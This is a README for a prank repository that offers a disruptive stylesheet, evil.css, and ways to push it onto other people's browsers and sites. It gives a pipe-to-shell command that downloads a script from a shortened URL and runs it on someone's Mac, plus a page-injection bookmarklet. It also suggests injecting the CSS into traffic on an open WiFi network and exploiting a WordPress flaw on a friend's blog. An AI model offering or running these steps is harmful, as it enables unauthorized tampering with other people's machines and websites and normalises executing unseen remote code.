Pranks!
=======

A collection of pranks and stuff!

evil.css
--------
Mess with peoples' webpages. Various subtle and not-so-subtle CSS rules that will slowly drive people insane.

### How to use it

Inject it into unsuspecting users' webpages. evil.js was intended to wreak havoc on sites hotlinking JavaScript library files, however hotlinking CSS is far less common. Some other evil ideas:

* Set it as the user stylesheet in a browser (example: discouraging "customers" at retail stores from using the computers to browse Facebook and check their email).
* Inject it into webpages or CSS files served to WiFi leachers on your open access point.
* Exploit this week's WordPress vulnerability and add it to your friend's blog.
* Hack an Internet backbone router and inject it into _everyone's_ webpages.

A script called `evil-safari-mac.sh` is included that automates setting Safari's user stylesheet to the latest version of evil.css. This takes tlrobinson's latest version. Run it on any Mac using Terminal.app with this easy to remember URL:

    curl -L j.mp/lisgar-prank | sh

Uninstall it by deselecting the stylesheet in Safari's preferences, or execute this in a shell:

    curl -L j.mp/lp-remove | sh

### Demo

This bookmarklet will inject the latest version of evil.css into any webpage, just copy and paste into the URL bar and hit enter:

    javascript:(function(d,l){l=d.createElement("link");l.rel="stylesheet";l.href="https://raw.githubusercontent.com/RetroCraft/Pranks/master/evil.css/evil.css";d.body.appendChild(l)})(document);
    
### Credits

Forked from tlrobinson.

Obligatory disclaimer
---------------------

All these pranks are purely for entertainment purposes. I'm not responsible for anything you do with any of these, nor do I suggest doing any of the above activities, especially hacking backbone routers.
